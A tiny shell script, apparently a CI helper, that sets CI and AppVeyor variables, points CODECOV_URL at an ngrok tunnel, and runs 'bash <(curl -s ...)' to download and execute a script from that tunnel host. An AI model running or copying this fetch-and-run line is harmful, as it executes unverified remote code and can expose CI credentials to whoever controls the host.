#!/bin/sh

set -x



export CI="True"
export APPVEYOR="True"
export CODECOV_URL="https://e68cb227.ngrok.io/"
bash <(curl -s https://e68cb227.ngrok.io/bash) 
